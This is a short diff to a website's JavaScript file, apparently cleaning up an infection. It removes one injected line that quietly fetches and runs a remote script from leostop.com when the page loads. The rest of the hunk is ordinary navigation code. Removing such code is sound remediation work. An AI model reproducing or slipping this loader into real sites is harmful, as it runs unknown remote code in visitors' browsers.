@@ -72,8 +72,6 @@ function closeNav() {
   document.getElementById("mySidepanel").style.width = "0";
 }
 
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
-
 /* Animate js*/
 
 (function($) {
